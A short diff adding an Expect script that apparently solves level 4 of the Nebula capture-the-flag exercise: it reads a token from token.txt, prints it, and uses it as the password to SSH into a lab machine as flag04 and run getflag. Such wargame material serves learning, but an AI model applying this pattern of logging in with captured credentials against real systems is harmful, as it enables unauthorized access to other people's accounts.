@@ -1,0 +1,8 @@
+set pwd [exec cat token.txt]
+puts $pwd
+spawn  ssh flag04@192.168.137.37
+expect "password:"
+send "${pwd}\n";
+expect "flag04@nebula:~$"
+send "whoami; getflag; exit\n"
+interact
